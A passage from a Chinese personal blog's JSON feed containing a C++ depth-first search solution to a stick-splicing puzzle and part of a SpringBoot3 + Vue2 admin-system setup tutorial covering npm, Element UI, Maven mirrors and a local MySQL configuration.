的木棍</li>\n<li>剪枝优化\n<ul>\n<li>优化搜索顺序：<strong>从大到小</strong>去枚举，减少了后续木棍的选择，进而减少了搜索树的节点数目</li>\n<li>排除等效冗余：组合型枚举，每一根长木棍的内部的小木棍编号递增</li>\n<li>可行性剪枝\n<ul>\n<li>失败后，<strong>跳过</strong>与当前木棍长度相等的其他木棍</li>\n<li>某个新长木棍中，尝试接入的第一根木棍的递归分支返回失败的话，则<strong>回溯</strong>更换</li>\n<li>若当前小木棍接入的是最后一根符合条件的长木棍，剩余木棍无解，则<strong>回溯</strong>更换</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n<pre><code class=\"language-c++\">#include &lt;iostream&gt;\n#include &lt;cstring&gt;\n#include &lt;algorithm&gt;\n\nusing namespace std;\n\nconst int N = 60;\n\nint n;\nint stick[N]; // 每根木棍的长度\nbool st[N]; // 木棍是否被使用\nint sum, len; // sum当前木棍的总长度；len枚举的长度\n\n// u当前枚举到的长木棍;cur当前长木棍的长度;start当前长木棍在拼的小木棍的下标\nbool dfs(int u, int cur, int start) &#123;\n    // 所有的小木棍都拼成了长木棍\n    if (u * len == sum) return true;\n    // 长木棍已经拼接完成，搜索下一根\n    if (cur == len) return dfs(u + 1, 0, 0);\n    \n    for (int i = start; i &lt; n; i ++ ) &#123;\n        // 当前小木棍被用过了\n        if (st[i]) continue;\n        // 判断当前木棍能否使用\n        if (cur + stick[i] &lt;= len) &#123;\n            st[i] = true;\n            if (dfs(u, cur + stick[i], i + 1)) return true;\n            st[i] = false;\n        &#125;\n        \n        // 当前是一根新长木棍，剪枝2和3\n        if (!cur || cur + stick[i] == len) return false;\n        \n        // 剪枝1，从i+1开始，长度与i相等的跳过\n        int j = i +  1;\n        while (j &lt; n &amp;&amp; stick[j] == stick[i]) j++;\n        i = j - 1;\n    &#125;\n    return false;\n&#125;\n\nint main()\n&#123;\n    while (cin &gt;&gt; n, n) &#123;\n        // 清空\n        sum = len = 0;\n        // 依次读入每根木棍\n        for (int i = 0; i &lt; n; i ++ ) &#123;\n            cin &gt;&gt; stick[i];\n            sum += stick[i];\n            len = max(len, stick[i]); // 最小的长度要大于等于最短木棍的长度\n        &#125;\n        // 从大到小排序\n        sort(stick, stick + n, greater&lt;int&gt;());\n    \n        // 清空\n        memset(st, 0, sizeof st);\n        while (true) &#123;\n            // 整除且能够搜索到方案\n            if (sum % len == 0 &amp;&amp; dfs(0, 0, 0)) &#123;\n                // 输出枚举长度\n                cout &lt;&lt; len &lt;&lt; endl;\n                break;\n            &#125;\n            len ++ ;\n        &#125;\n    &#125;\n    return 0;\n&#125;\n</code></pre>\n<h2 id=\"bfs\"><a class=\"anchor\" href=\"#bfs\">#</a> BFS</h2>\n<h2 id=\"flood-fill\"><a class=\"anchor\" href=\"#flood-fill\">#</a> Flood Fill</h2>\n<h2 id=\"并查集\"><a class=\"anchor\" href=\"#并查集\">#</a> 并查集</h2>\n<h2 id=\"哈希表\"><a class=\"anchor\" href=\"#哈希表\">#</a> 哈希表</h2>\n<h2 id=\"单调队列\"><a class=\"anchor\" href=\"#单调队列\">#</a> 单调队列</h2>\n<h2 id=\"树状数组\"><a class=\"anchor\" href=\"#树状数组\">#</a> 树状数组</h2>\n<h2 id=\"状态压缩dp\"><a class=\"anchor\" href=\"#状态压缩dp\">#</a> 状态压缩 DP</h2>\n<h2 id=\"线性dp\"><a class=\"anchor\" href=\"#线性dp\">#</a> 线性 DP</h2>\n<h2 id=\"背包问题\"><a class=\"anchor\" href=\"#背包问题\">#</a> 背包问题</h2>\n<h2 id=\"最长公共子串\"><a class=\"anchor\" href=\"#最长公共子串\">#</a> 最长公共子串</h2>\n<h2 id=\"区间dp\"><a class=\"anchor\" href=\"#区间dp\">#</a> 区间 DP</h2>\n<h2 id=\"树形dp\"><a class=\"anchor\" href=\"#树形dp\">#</a> 树形 DP</h2>\n<h2 id=\"快速幂\"><a class=\"anchor\" href=\"#快速幂\">#</a> 快速幂</h2>\n<h2 id=\"最大公约数\"><a class=\"anchor\" href=\"#最大公约数\">#</a> 最大公约数</h2>\n<h2 id=\"分解质因数\"><a class=\"anchor\" href=\"#分解质因数\">#</a> 分解质因数</h2>\n<h2 id=\"矩阵乘法\"><a class=\"anchor\" href=\"#矩阵乘法\">#</a> 矩阵乘法</h2>\n<h2 id=\"组合计数\"><a class=\"anchor\" href=\"#组合计数\">#</a> 组合计数</h2>\n<h2 id=\"数学期望\"><a class=\"anchor\" href=\"#数学期望\">#</a> 数学期望</h2>\n<h2 id=\"欧拉函数\"><a class=\"anchor\" href=\"#欧拉函数\">#</a> 欧拉函数</h2>\n<h2 id=\"最短路\"><a class=\"anchor\" href=\"#最短路\">#</a> 最短路</h2>\n<h2 id=\"贪心\"><a class=\"anchor\" href=\"#贪心\">#</a> 贪心</h2>\n<h2 id=\"括号序列\"><a class=\"anchor\" href=\"#括号序列\">#</a> 括号序列</h2>\n<h2 id=\"a算法\"><a class=\"anchor\" href=\"#a算法\">#</a> A * 算法</h2>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vRnJhbmtDaGVuODMxWC9wLzEwMzU4MTIwLmh0bWw=\">A* 算法详解</span></p>\n<h1 id=\"真题复现\"><a class=\"anchor\" href=\"#真题复现\">#</a> 真题复现</h1>\n<h2 id=\"2023\"><a class=\"anchor\" href=\"#2023\">#</a> 2023</h2>\n<h2 id=\"2022\"><a class=\"anchor\" href=\"#2022\">#</a> 2022</h2>\n",
            "tags": [
                "算法",
                "Algorithm"
            ]
        },
        {
            "id": "http://yoursite.com/As%20Developers/%E5%90%8E%E5%8F%B0%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/",
            "url": "http://yoursite.com/As%20Developers/%E5%90%8E%E5%8F%B0%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/",
            "title": "SpringBoot3+Vue2后台管理系统",
            "date_published": "2024-03-16T15:29:08.000Z",
            "content_html": "<h1 id=\"vue2继承elementui\"><a class=\"anchor\" href=\"#vue2继承elementui\">#</a> Vue2 继承 ElementUI</h1>\n<h2 id=\"vue\"><a class=\"anchor\" href=\"#vue\">#</a> Vue</h2>\n<h3 id=\"卸载\"><a class=\"anchor\" href=\"#卸载\">#</a> 卸载</h3>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>//卸载3.0之前的版本</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">npm</span> uninstall <span class=\"token parameter variable\">-g</span> vue-cli</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">yarn</span> global remove vue-cli</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>//卸载3.0之后的版本（可以统一使用此指令卸载）</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token function\">npm</span> uninstall <span class=\"token parameter variable\">-g</span> @vue/cli</pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token function\">yarn</span> global remove @vue/cli</pre></td></tr></table></figure><h3 id=\"安装\"><a class=\"anchor\" href=\"#安装\">#</a> 安装</h3>\n<ol>\n<li>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">npm</span> <span class=\"token function\">install</span> <span class=\"token parameter variable\">-g</span> @vue/cli@4.5.14</pre></td></tr></table></figure></li>\n<li>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>vue <span class=\"token parameter variable\">--version</span></pre></td></tr></table></figure></li>\n</ol>\n<h3 id=\"创建项目\"><a class=\"anchor\" href=\"#创建项目\">#</a> 创建项目</h3>\n<ol>\n<li>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>vue create vue</pre></td></tr></table></figure></li>\n</ol>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240115230234928.png\" alt=\"image-20240115230234928\" /></p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240115231358864.png\" alt=\"image-20240115231358864\" /></p>\n<p>空格进行选择，方向键移动</p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240115231433151.png\" alt=\"image-20240115231433151\" /></p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240115231455356.png\" alt=\"image-20240115231455356\" /></p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240115231550858.png\" alt=\"image-20240115231550858\" /></p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240115231611122.png\" alt=\"image-20240115231611122\" /></p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240115231632392.png\" alt=\"image-20240115231632392\" /></p>\n<p><strong>npm run serve</strong> 启动</p>\n<p>修改部分代码（<strong>数据绑定</strong>），显示效果</p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240115233853513.png\" alt=\"image-20240115233853513\" /></p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240115233925562.png\" alt=\"image-20240115233925562\" /></p>\n<h2 id=\"element\"><a class=\"anchor\" href=\"#element\">#</a> Element</h2>\n<p>利用<strong> Element 框架</strong>做后台系统，文档如下</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9lbGVtZW50LmVsZW1lLmNuLyMvemgtQ04vY29tcG9uZW50L2luc3RhbGxhdGlvbg==\">https://element.eleme.cn/#/zh-CN/component/installation</span></p>\n<h3 id=\"安装-2\"><a class=\"anchor\" href=\"#安装-2\">#</a> 安装</h3>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">npm</span> i element-ui <span class=\"token parameter variable\">-S</span></pre></td></tr></table></figure><p>安装好后 package.json 的版本依赖</p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240115235336241.png\" alt=\"image-20240115235336241\" /></p>\n<h3 id=\"使用方法\"><a class=\"anchor\" href=\"#使用方法\">#</a> 使用方法</h3>\n<p><strong>main.js 引入 element 组件</strong></p>\n<figure class=\"highlight js\"><figcaption data-lang=\"JavaScript\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> Vue <span class=\"token keyword\">from</span> <span class=\"token string\">'vue'</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> App <span class=\"token keyword\">from</span> <span class=\"token string\">'./App.vue'</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">import</span> router <span class=\"token keyword\">from</span> <span class=\"token string\">'./router'</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">import</span> ElementUI <span class=\"token keyword\">from</span> <span class=\"token string\">'element-ui'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token string\">'element-ui/lib/theme-chalk/index.css'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>Vue<span class=\"token punctuation\">.</span>config<span class=\"token punctuation\">.</span>productionTip <span class=\"token operator\">=</span> <span class=\"token boolean\">false</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>Vue<span class=\"token punctuation\">.</span><span class=\"token function\">use</span><span class=\"token punctuation\">(</span>ElementUI<span class=\"token punctuation\">,</span><span class=\"token punctuation\">&#123;</span><span class=\"token literal-property property\">size</span><span class=\"token operator\">:</span><span class=\"token string\">\"small\"</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">new</span> <span class=\"token class-name\">Vue</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>  router<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  <span class=\"token function-variable function\">render</span><span class=\"token operator\">:</span> <span class=\"token parameter\">h</span> <span class=\"token operator\">=></span> <span class=\"token function\">h</span><span class=\"token punctuation\">(</span>App<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">$mount</span><span class=\"token punctuation\">(</span><span class=\"token string\">'#app'</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><strong>在 Home.vue 引入 el-button 测试</strong></p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240116084601170.png\" alt=\"image-20240116084601170\" /></p>\n<pre><code class=\"language-vue\">&lt;template&gt;\n  &lt;div class=&quot;home&quot;&gt;\n    &lt;el-button type=&quot;danger&quot;&gt;这是&#123;&#123;msg&#125;&#125;&lt;/el-button&gt;\n    &lt;img alt=&quot;Vue logo&quot; src=&quot;../assets/logo.png&quot;&gt;\n    &lt;HelloWorld msg=&quot;Welcome to Your Vue.js App&quot;/&gt;\n  &lt;/div&gt;\n&lt;/template&gt;\n\n&lt;script&gt;\n// @ is an alias to /src\nimport HelloWorld from '@/components/HelloWorld.vue'\n\nexport default &#123;\n  name: 'Home',\n  components: &#123;\n    HelloWorld\n  &#125;,\n  data() &#123;\n    return &#123;\n      msg: &quot;Xh1Xxhg&quot;\n    &#125;\n  &#125;\n&#125;\n&lt;/script&gt;\n</code></pre>\n<h1 id=\"vue后台主题布局\"><a class=\"anchor\" href=\"#vue后台主题布局\">#</a> Vue 后台主题布局</h1>\n<ol>\n<li>\n<p>element <strong>Container 布局容器</strong> ——&gt;CV 代码</p>\n</li>\n<li>\n<p>创建 assets/global.css，在 main.js 用 import 引入</p>\n</li>\n<li>\n<p>return 的数组个数减少，列表长度减少</p>\n</li>\n<li>\n<p>导航栏贴边 —— 所有外部容器高度撑满 height: 100%</p>\n</li>\n<li>\n<p>菜单折叠属性，动态绑定 collapseBtnClass 变量 https://element.eleme.cn/#/zh-CN/component/menu#menu-group-attribute</p>\n</li>\n<li>\n<p>icon 图标 https://element.eleme.cn/#/zh-CN/component/icon</p>\n</li>\n<li>\n<p>cursor: pointer 悬浮变成小手形状</p>\n</li>\n<li>\n<p><code>&lt;i&gt;</code>  元素是 HTML 中的内联元素，通常用于表示斜体文本或图标。</p>\n</li>\n<li>\n<p>v-bind 指令 ——&quot;: 属性名&quot;—— 使用冒号前缀，可以将 HTML 元素的属性与 Vue.js 组件实例中的数据进行绑定</p>\n</li>\n<li>\n<p>&lt;span slot=&quot;title&quot;&gt; 导航三 &lt; /span&gt;</p>\n</li>\n<li>\n<p>插槽 slot</p>\n<ol>\n<li>\n<p>父组件导入子组件并调用，将父组件的内容渲染到子组件 &lt;slot&gt;&lt;/slot &gt; 占位处</p>\n</li>\n<li>\n<p>element Collapse 组件属性，slot=&quot;title&quot; 传递组件内容为面板标题</p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240116130013554.png\" alt=\"image-20240116130013554\" /></p>\n</li>\n</ol>\n</li>\n<li>\n<p><code>v-if</code>  是 Vue.js 框架中的一种条件渲染指令。它用于根据条件来决定是否渲染或移除某个元素或组件。若条件为 false，则元素被移除</p>\n</li>\n<li>\n<p>左侧导航栏阴影效果（模仿若依）</p>\n<figure class=\"highlight css\"><figcaption data-lang=\"CSS\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token property\">box-shadow</span><span class=\"token punctuation\">:</span> 2px 0 6px <span class=\"token function\">rgba</span><span class=\"token punctuation\">(</span>0<span class=\"token punctuation\">,</span>21<span class=\"token punctuation\">,</span>41<span class=\"token punctuation\">,</span>.35<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure></li>\n<li>\n<p>去掉 div 的边框可以去掉 css 的 border 属性 ，或者覆盖 border 属性为 none 来实现 <code>border: none</code></p>\n</li>\n<li>\n<p>padding: 10px 0 其余方向均为 10px，左侧为 0</p>\n</li>\n<li>\n<p><code>slot-scope</code>  属性用于定义插槽的作用域，以便在插槽内部可以访问父组件中的数据。Vue.js 2.x 中的  <code>slot-scope</code>  在 Vue.js 3.x 中已经被废弃，在 Vue.js 3.x 中，可以使用  <code>&lt;template v-slot&gt;</code>  来实现插槽的作用域功能。</p>\n</li>\n<li>\n<p>element——Breadcrumb 面包屑 —— 页签</p>\n</li>\n<li>\n<p>el-table 设置边框和斑马纹时属性 true 不用写，false 才需要写</p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240117123309870.png\" alt=\"image-20240117123309870\" /></p>\n</li>\n<li></li>\n</ol>\n<h1 id=\"springboot初始\"><a class=\"anchor\" href=\"#springboot初始\">#</a> Springboot 初始</h1>\n<h2 id=\"创建项目-2\"><a class=\"anchor\" href=\"#创建项目-2\">#</a> 创建项目</h2>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240116181343209.png\" alt=\"image-20240116181343209\" /></p>\n<p>选择 Lombok，简化 java 开发代码的插件</p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240116180716832.png\" alt=\"image-20240116180716832\" /></p>\n<p>选 Spring Web</p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240116180758632.png\" alt=\"image-20240116180758632\" /></p>\n<p>SQL 选择 MySQL Driver 和 Mybatis Framework</p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240116180914293.png\" alt=\"image-20240116180914293\" /></p>\n<p><strong>总</strong></p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240116181030444.png\" alt=\"image-20240116181030444\" /></p>\n<h2 id=\"pom配置阿里云仓库\"><a class=\"anchor\" href=\"#pom配置阿里云仓库\">#</a> pom 配置阿里云仓库</h2>\n<p>在 maven pom.xml 中直接使用阿里云镜像<br />\n仅仅在 maven settings.xml 中添加本地仓库，项目中单独配置阿里云镜像</p>\n<figure class=\"highlight xml\"><figcaption data-lang=\"XML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>repositories</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>repository</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>id</span><span class=\"token punctuation\">></span></span>aliyun-repos<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>id</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>url</span><span class=\"token punctuation\">></span></span>https://maven.aliyun.com/repository/public<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>url</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>releases</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>            <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>enabled</span><span class=\"token punctuation\">></span></span>true<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>enabled</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>releases</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>snapshots</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>            <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>enabled</span><span class=\"token punctuation\">></span></span>false<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>enabled</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>snapshots</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>repository</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>repositories</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>pluginRepositories</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>pluginRepository</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>id</span><span class=\"token punctuation\">></span></span>aliyun-repos<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>id</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>url</span><span class=\"token punctuation\">></span></span>https://maven.aliyun.com/repository/public<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>url</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>releases</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>            <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>enabled</span><span class=\"token punctuation\">></span></span>true<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>enabled</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>releases</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>snapshots</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>            <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>enabled</span><span class=\"token punctuation\">></span></span>false<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>enabled</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>snapshots</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>pluginRepository</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>pluginRepositories</span><span class=\"token punctuation\">></span></span></pre></td></tr></table></figure><blockquote>\n<p>注： &lt;repositories&gt; 标签控制 maven 依赖下载的镜像地址，&lt;pluginRepositories&gt; 标签控制 maven 插件的下载镜像地址，如果其中一个没配置，那么默认依旧使用默认的仓库地址。</p>\n</blockquote>\n<blockquote>\n<p>个人想法：这样的好处是，项目团队共同开发的时候，直接拉取代码就好，不用单独配置本地 maven 配置文件，如果多个项目共同使用一个 maven 配置文件，可能不方便，如果涉及到自己搭建的私服，不同项目的私服地址可能不一样。项目用什么就配置什么，灵活点。</p>\n</blockquote>\n<blockquote>\n<p>补充：<br />\nsetting.xml：该文件配置的是全局模式<br />\n pom.xml：该文件的配置的是项目独享模式<br />\n注意：若 pom.xml 和 setting.xml 同时配置了，以 pom.xml 为准。</p>\n</blockquote>\n<h2 id=\"搭建项目\"><a class=\"anchor\" href=\"#搭建项目\">#</a> 搭建项目</h2>\n<p>删除没用的文件</p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240116210445062.png\" alt=\"image-20240116210445062\" /></p>\n<p>运行报错，需要连接数据库</p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240116222622477.png\" alt=\"image-20240116222622477\" /></p>\n<p>创建数据库 Navicat / SQLyog（此处为 SQLyog）</p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240116211902920.png\" alt=\"image-20240116211902920\" /></p>\n<p><strong>resources/application.yml</strong></p>\n<figure class=\"highlight yaml\"><figcaption data-lang=\"YAML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token key atrule\">spring</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>  <span class=\"token key atrule\">datasource</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token key atrule\">driver-class-name</span><span class=\"token punctuation\">:</span> com.mysql.cj.jdbc.Driver</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token key atrule\">url</span><span class=\"token punctuation\">:</span> jdbc<span class=\"token punctuation\">:</span>mysql<span class=\"token punctuation\">:</span>//localhost<span class=\"token punctuation\">:</span>3306/xh1xxhg<span class=\"token punctuation\">?</span>serverTimezone=GMT%2b8</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token key atrule\">username</span><span class=\"token punctuation\">:</span> root</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token key atrule\">password</span><span class=\"token punctuation\">:</span> root</pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token key atrule\">server</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  <span class=\"token key atrule\">port</span><span class=\"token punctuation\">:</span> <span class=\"token number\">9090</span></pre></td></tr></table></figure><p><strong>启动类 SpringbootApplication.java</strong></p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">package</span> <span class=\"token namespace\">com<span class=\"token punctuation\">.</span>xoxbc<span class=\"token punctuation\">.</span>springboot</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">org<span class=\"token punctuation\">.</span>springframework<span class=\"token punctuation\">.</span>boot<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">SpringApplication</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">org<span class=\"token punctuation\">.</span>springframework<span class=\"token punctuation\">.</span>boot<span class=\"token punctuation\">.</span>autoconfigure<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">SpringBootApplication</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">org<span class=\"token punctuation\">.</span>springframework<span class=\"token punctuation\">.</span>web<span class=\"token punctuation\">.</span>bind<span class=\"token punctuation\">.</span>annotation<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">GetMapping</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td 